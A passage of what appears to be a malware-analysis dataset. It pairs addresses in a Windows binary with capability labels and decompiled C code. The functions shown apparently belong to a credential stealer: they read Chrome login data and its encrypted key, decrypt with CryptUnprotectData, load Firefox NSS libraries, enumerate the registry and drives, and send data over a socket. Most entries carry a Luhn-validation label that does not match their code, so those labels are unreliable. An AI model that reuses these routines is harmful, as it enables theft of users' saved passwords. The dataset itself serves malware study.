(*pcVar3)(0x419d10);\n        (*pcVar2)(*(*0x41e6a0 + 4), 0x419d10, uVar4, iVar5, 0);\n        iVar5 = *0x41e6a0;\n    }\n    iVar6 = (*pcVar3)(var_ch);\n    (*pcVar2)(*(*0x41e6a0 + 4), var_ch, iVar6 * 2, iVar5 + 8, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(*0x41e6a0 + 4));\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 933
    },
    "0040c354": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c354(int32_t *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    uVar1 = *param_2;\n    iVar4 = *param_1;\n    iVar5 = 0;\n    iVar3 = fcn.004040c4();\n    pcVar2 = _sym.imp.SHLWAPI.dll_StrStrA;\n    while( true ) {\n        iVar4 = (*pcVar2)(iVar4, uVar1);\n        if (iVar4 == 0) break;\n        iVar5 = iVar5 + 1;\n        iVar4 = iVar3 + 4 + iVar4;\n    }\n    return iVar5;\n}\n",
        "token_count": 189
    },
    "0040c38d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c38d(uint *arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.004040c4();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    iVar3 = *in_EDX;\n    uVar4 = *arg_8h;\n    do {\n        iVar3 = (*pcVar1)(iVar3, uVar4);\n        iVar3 = iVar2 + 3 + iVar3;\n        arg_ch = arg_ch + -1;\n    } while (arg_ch != 0);\n    iVar2 = (*pcVar1)(iVar3, 0x41b3c4);\n    uVar4 = fcn.00406e8d();\n    fcn.0040126d(uVar4, iVar3, iVar2 - iVar3);\n    fcn.0040434f(uVar4);\n    fcn.00406f1d();\n    return in_ECX;\n}\n",
        "token_count": 269
    },
    "0040c44e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c44e(uint arg_8h)\n\n{\n    fcn.00403eca(&arg_8h);\n    fcn.00404081();\n    return;\n}\n",
        "token_count": 44
    },
    "0040c73a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: hKey\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0040c73a(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    uint32_t unaff_EDI;\n    uint var_1010h;\n    uint uStackY208;\n    uint uStackY204;\n    uint *puStackY200;\n    uint uStackY196;\n    uint uStackY192;\n    uint *puStackY188;\n    uint uStackY184;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    hKey = 0x40c747;\n    fcn.00401230();\n    uVar4 = 0;\n    hKey = unaff_EBX;\n    fcn.00401293();\n    fcn.00401293();\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyExW;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n    if ((((iVar3 == 0) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) || (iVar3 = (*pcVar1)(),  iVar3 == 0)) ||\n       (iVar3 = (*pcVar1)(),  iVar3 == 0)) {\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcpyW;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyW)();\n        if (iVar3 == 0) {\n            if (unaff_EDI != 0) {\n                do {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyExW)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    (*pcVar2)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uStackY184 = 0x40c8c0;\n                    fcn.0040c8fc(hKey);\n                    uStackY184 = hKey;\n                    puStackY188 = 0x40c8c9;\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n                    puStackY188 = &fcn.0040c73a::hKey;\n                    uStackY192 = 0xf003f;\n                    uStackY196 = 0;\n                    puStackY200 = &fcn.0040c73a::var_1010h;\n                    uStackY204 = 0x80000001;\n                    uStackY208 = 0x40c8e2;\n                    iVar3 = (*pcVar1)();\n                    if (iVar3 != 0) {\n                        return 0;\n                    }\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < unaff_EDI);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 745
    },
    "0040cc6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: pDataIn\n\nvoid __cdecl fcn.0040cc6b(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    int32_t extraout_ECX;\n    uint16_t *puVar2;\n    uint extraout_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    char16_t acStack8216 [4076];\n    uint uStack64;\n    uint uStack60;\n    char16_t *pcStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint pDataOut;\n    int32_t var_10h;\n    int32_t pDataIn;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0x40cc78;\n    fcn.00401230();\n    var_10h = arg_8h + -1;\n    pDataOut = 0x40;\n    puStack28 = 0x40cc8f;\n    var_4h = extraout_ECX;\n    var_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    iVar3 = 1;\n    if (1 < arg_8h) {\n        do {\n            *(var_8h + -1 + iVar3) = *(iVar3 + var_4h);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    pDataIn = arg_8h + -1;\n    iVar4 = 0;\n    puStack28 = &fcn.0040cc6b::pDataOut;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 0;\n    puStack52 = &fcn.0040cc6b::pDataIn;\n    pcStack56 = 0x40ccc5;\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)();\n    if (iVar3 == 0) {\n        pcStack56 = L\"Could not decrypt\";\n    }\n    else {\n        if (0 < arg_8h) {\n            puVar2 = &stack0xffffdfe8;\n            do {\n                puVar1 = var_10h + iVar4;\n                iVar4 = iVar4 + 2;\n                *puVar2 = *puVar1;\n                puVar2 = puVar2 + 1;\n            } while (iVar4 < arg_8h);\n        }\n        pcStack56 = &stack0xffffdfe8;\n    }\n    uStack64 = 0x40ccfc;\n    uStack60 = extraout_EDX;\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n    return;\n}\n",
        "token_count": 675
    },
    "0040da6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pcbBinary\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: lpString2\n\nvoid __cdecl fcn.0040da6a(uint pszString, uint *arg_ch)\n\n{\n    int32_t extraout_ECX;\n    uint pbBinary;\n    uint uStack64;\n    uint *puStack60;\n    uint *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    uint pcbBinary;\n    \n    pcbBinary = 0x40da77;\n    fcn.00401230();\n    var_10h = pszString;\n    pcbBinary = 0x1fa0;\n    var_14h = 0x40da8d;\n    uStack44 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    var_14h = 0x1fa0;\n    var_1ch = &fcn.0040da6a::pbBinary;\n    var_18h = NULL;\n    puStack36 = 0x40da9f;\n    fcn.00401293();\n    var_1ch = &fcn.0040da6a::pcbBinary;\n    var_14h = 0;\n    var_18h = NULL;\n    puStack36 = &fcn.0040da6a::pbBinary;\n    uStack40 = 1;\n    uStack48 = pszString;\n    iStack52 = 0x40dabb;\n    (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)();\n    var_18h = &fcn.0040da6a::pbBinary;\n    var_1ch = NULL;\n    var_14h = pcbBinary;\n    puStack56 = &fcn.0040da6a::var_10h;\n    iStack52 = 0;\n    puStack60 = &fcn.0040da6a::var_1ch;\n    lpString2 = 0;\n    var_8h = 0;\n    var_10h = 0;\n    uStack64 = 0x40dae5;\n    (**(extraout_ECX + 0x8c))();\n    *(var_8h + lpString2) = 0;\n    iStack52 = 0x40dafc;\n    puStack56 = fcn.00406f2c();\n    iStack52 = lpString2;\n    *arg_ch = puStack56;\n    puStack60 = 0x40db0b;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n    return;\n}\n",
        "token_count": 636
    },
    "0040de44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040de44(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004136c8();\n    if (0x17c < iVar1 - 0x26cU) {\n        return iVar1 - 0x1838U < 0xed9;\n    }\n    return true;\n}\n",
        "token_count": 75
    },
    "0040df9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get common file path",
            "check if file exists",
            "set current directory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040df9d(uint lpPathName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint uVar4;\n    int32_t iVar5;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint pszPath;\n    \n    uVar4 = 0;\n    fcn.00401293(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(lpPathName);\n    fcn.004043fa(0x4194e4);\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"nss3.dll\");\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"msvcr120.dll\");\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"msvcp120.dll\");\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"mozglue.dll\");\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"softokn3.dll\");\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"msvcp\");\n    fcn.00404656(&lpPathName);\n    fcn.004043fa(L\"msvcr\");\n    iVar5 = 0x5a;\n    var_8h = 0x5a;\n    do {\n        fcn.00404656(&var_18h);\n        fcn.00404477(var_8h);\n        fcn.004043fa(0x41abc4);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath);\n        if (iVar2 != 0) {\n            fcn.004043c7(&pszPath);\n            fcn.00406f1d();\n            break;\n        }\n        var_8h = var_8h + 10;\n        fcn.00406f1d();\n        pszPath = 0;\n    } while (var_8h != 0x96);\n    do {\n        fcn.00404656(&var_14h);\n        fcn.00404477(iVar5);\n        fcn.004043fa(0x41abc4);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath);\n        if (iVar2 != 0) {\n            fcn.004043c7(&pszPath);\n            fcn.00406f1d();\n            break;\n        }\n        iVar5 = iVar5 + 10;\n        fcn.00406f1d();\n        pszPath = 0;\n    } while (iVar5 != 0x96);\n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_10h);\n    *(in_ECX + 0xc4) = uVar3;\n    uVar3 = (*pcVar1)(var_ch);\n    *(in_ECX + 200) = uVar3;\n    uVar3 = (*pcVar1)(var_20h);\n    *(in_ECX + 0xcc) = uVar3;\n    uVar3 = (*pcVar1)(var_24h);\n    *(in_ECX + 0xd0) = uVar3;\n    iVar5 = (*pcVar1)(var_1ch);\n    *(in_ECX + 0xd4) = iVar5;\n    if ((((*(in_ECX + 200) != 0) && (*(in_ECX + 0xcc) != 0)) && (*(in_ECX + 0xd0) != 0)) && (iVar5 != 0)) {\n        uVar4 = fcn.0041473a(*(in_ECX + 0xd0));\n        *(in_ECX + 0x84) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x9c) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x98) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x8c) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x90) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x94) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0x88) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0xa0) = uVar4;\n        uVar4 = fcn.0041473a();\n        *(in_ECX + 0xa4) = uVar4;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        uVar4 = 1;\n    }\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return uVar4;\n}\n",
        "token_count": 1307
    },
    "0040eb8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040eb8e(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    var_8h = 0x104;\n    var_ch = 1;\n    fcn.00401293(&lpString1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\\");\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, param_1);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, &lpString1, 0, 1, &hKey);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"Path\", 0, &var_ch, param_2, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 266
    },
    "004100de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004100de(void)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    int32_t iVar1;\n    uint noname_0;\n    uint var_4h;\n    \n    fcn.0040fb4b(L\"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\", L\"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", 0, 0\n                 , 1);\n    iVar1 = 1;\n    do {\n        arg_ch = fcn.00401000(0x400);\n        (*_sym.imp.USER32.dll_wsprintfW)(arg_ch, 0x419e94, iVar1);\n        noname_0 = 0x400;\n        arg_8h = fcn.00401000();\n        fcn.00415cc4(noname_0, arg_ch);\n        fcn.00401014(arg_ch);\n        fcn.0040fb4b(arg_8h, L\"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", 0, 0, 1);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x15);\n    return 1;\n}\n",
        "token_count": 257
    },
    "00410170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410170(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x100);\n    fcn.00401293(&var_108h, 0, 0xf2);\n    var_110h = *in_ECX;\n    var_4h = &var_110h;\n    var_10ch = in_ECX[1];\n    var_ch = arg_ch;\n    var_8h = uVar1;\n    fcn.004024bb(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 217
    },
    "004103e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004103e4(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint var_4h;\n    \n    iVar1 = fcn.004106b1();\n    if (iVar1 != 0) {\n        iVar1 = fcn.00410680();\n        if ((((iVar1 == 0) ||\n             (iVar1 = fcn.00410468(in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, 0, \n                                   arg_1ch, arg_20h),  iVar1 == 0)) &&\n            (iVar1 = fcn.00410468(in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, 0, arg_1ch\n                                  , arg_20h),  iVar1 == 0)) &&\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar2 == -0x7ff6fff5)) {\n            iVar1 = 0;\n        }\n        fcn.004107d1();\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "00410468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00410468(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint dwFlags, int32_t *arg_1ch, uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint pDataIn;\n    uint var_14h;\n    uint pOptionalEntropy;\n    uint var_ch;\n    uint pDataOut;\n    uint hMem;\n    \n    pOptionalEntropy = 0;\n    var_ch = 0;\n    iVar1 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)(&pDataIn, 0, &pOptionalEntropy, 0, 0, dwFlags, &pDataOut);\n    if (iVar1 != 0) {\n        *arg_20h = pDataOut;\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, pDataOut);\n        *arg_1ch = arg_8h;\n        if (arg_8h != 0) {\n            fcn.0040126d(arg_8h, hMem, *arg_20h);\n        }\n        (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n    }\n    return iVar1;\n}\n",
        "token_count": 280
    },
    "0041079b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041079b(uint32_t uBytes, uint32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    if ((uBytes | arg_ch) != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, uBytes);\n        if (arg_8h != 0) {\n            fcn.0040126d(arg_8h, *in_ECX, uBytes);\n        }\n    }\n    *in_ECX = arg_8h;\n    return;\n}\n",
        "token_count": 142
    },
    "00410827": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410827(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint hMem;\n    \n    uVar3 = 0;\n    iVar1 = fcn.00410514(&var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = fcn.004104d3();\n    if (iVar1 == 0) goto code_r0x00410897;\n    iVar2 = fcn.00401098(iVar1, L\"\\\"os_crypt\\\":{\\\"encrypted_key\\\":\\\"\");\n    if (iVar2 == 0) {\ncode_r0x0041088e:\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x41b48c;\n        iVar2 = fcn.00401098(iVar2 + 0x3a);\n        if (iVar2 == 0) goto code_r0x0041088e;\n        uVar3 = fcn.0041035f(uVar3, arg_10h, arg_14h);\n    }\n    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\ncode_r0x00410897:\n    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n    return uVar3;\n}\n",
        "token_count": 321
    },
    "00411747": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00411747(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    \n    iVar1 = fcn.0041337b();\n    return iVar1 != 0;\n}\n",
        "token_count": 47
    },
    "0041254e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create a process with modified I/O handles and window"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0041254e(uint lpApplicationName, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_54h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00401293(&var_54h, 0, 0x44);\n    var_18h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = arg_14h;\n    var_24h._0_2_ = 0;\n    var_54h = 0x44;\n    var_28h = 0x101;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(lpApplicationName, 0, 0, 0, 1, 0x410, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *0x41e55c = var_10h;\n    }\n    fcn.00406f1d();\n    return iVar1 != 0;\n}\n",
        "token_count": 288
    },
    "00412f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412f38(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint in_EDX;\n    uint s;\n    \n    uVar1 = *0x41e8c4;\n    puVar2 = fcn.00401000(0x2000);\n    *puVar2 = arg_ch;\n    puVar2[1] = arg_8h;\n    fcn.0040126d(puVar2 + 2, in_EDX, arg_8h);\n    (*_sym.imp.WS2_32.dll_send)(uVar1, puVar2, arg_8h + 8, 0);\n    fcn.00401014(puVar2);\n    return;\n}\n",
        "token_count": 174
    },
    "00413248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00413248(uint param_1)\n\n{\n    int32_t iVar1;\n    uint Name;\n    uint ReferencedDomainName;\n    uint peUse;\n    uint cchName;\n    uint cchReferencedDomainName;\n    uint pIdentifierAuthority;\n    uint var_8h;\n    int32_t pSid;\n    \n    cchReferencedDomainName = 0x10;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    var_8h._0_2_ = 0x500;\n    fcn.00401293(&Name, 0, 0x208);\n    cchName = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                          (0, pSid, &Name, &cchName, &ReferencedDomainName, &cchReferencedDomainName, &peUse);\n        if (iVar1 != 0) goto code_r0x004132d2;\n    }\n    (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x004132d2:\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    fcn.0040460a(&Name);\n    return param_1;\n}\n",
        "token_count": 368
    },
    "00413915": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00413915(uint param_1, uint param_2)\n\n{\n    uint var_208h;\n    \n    fcn.00401293(&var_208h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathW)(0, &var_208h, param_2, 0);\n    fcn.0040460a(&var_208h);\n    return param_1;\n}\n",
        "token_count": 101
    },
    "00413da4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00413da4(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int16_t *lpString2;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint unaff_EDI;\n    int32_t iVar8;\n    int16_t *arg_ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t lpRootPathName;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int16_t *var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    lpString2 = fcn.00406fa7();\n    var_20h = 5;\n    var_28h = 5;\n    var_24h = 0;\n    var_ch = lpString2;\n    fcn.00401a34();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLogicalDriveStringsW;\n    arg_ch = lpString2;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)();\n    if (0x104 < uVar4) {\n        fcn.00406f8d();\n        lpString2 = fcn.00406fa7();\n        var_ch = lpString2;\n        (*pcVar2)(uVar4, lpString2);\n    }\n    iVar1 = *lpString2;\n    while (iVar1 != 0) {\n        lpRootPathName = 0;\n        uVar5 = fcn.0040460a(lpString2);\n        fcn.004043c7(uVar5);\n        fcn.00406f1d();\n        iVar7 = lpRootPathName;\n        var_4h = 0;\n        var_18h = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n        var_8h = &stack0xffffffbc;\n        uVar5 = 0;\n        puVar3 = &stack0xffffffbc;\n        if (iVar7 != 0) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar7);\n            uVar6 = fcn.00406f2c();\n            iVar8 = iVar7;\n            *var_8h = uVar6;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(uVar6, iVar8);\n            puVar3 = var_8h;\n        }\n        var_8h = puVar3;\n        puVar3 = var_8h;\n        var_8h[1] = var_18h;\n        puVar3[2] = var_14h;\n        fcn.0040193f(uVar5, arg_ch, unaff_EDI);\n        if (iVar7 == 0) {\n            iVar7 = 0;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar7);\n        }\n        lpString2 = lpString2 + iVar7 + 1;\n        fcn.00406f1d();\n        lpRootPathName = 0;\n        iVar1 = *lpString2;\n    }\n    fcn.00406f8d();\n    fcn.004014dd(&var_2ch);\n    fcn.00401524();\n    return var_10h;\n}\n",
        "token_count": 757
    },
    "004143f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "access PEB ldr_data",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004143f4(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_FS_OFFSET;\n    \n    puVar3 = *(*(in_FS_OFFSET + 0x30) + 0xc) + 0x14;\n    puVar2 = *puVar3;\n    while( true ) {\n        if (puVar2 == puVar3) {\n            return 0;\n        }\n        iVar1 = fcn.004144b6();\n        if (iVar1 == 0) break;\n        puVar2 = *puVar2;\n    }\n    return puVar2[4];\n}\n",
        "token_count": 148
    },
    "00414498": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00414498(int16_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (*param_1 == 0x5a4d) {\n        piVar1 = NULL;\n        if (*(*(param_1 + 0x1e) + param_1) == 0x4550) {\n            piVar1 = *(param_1 + 0x1e) + param_1;\n        }\n        return piVar1;\n    }\n    return NULL;\n}\n",
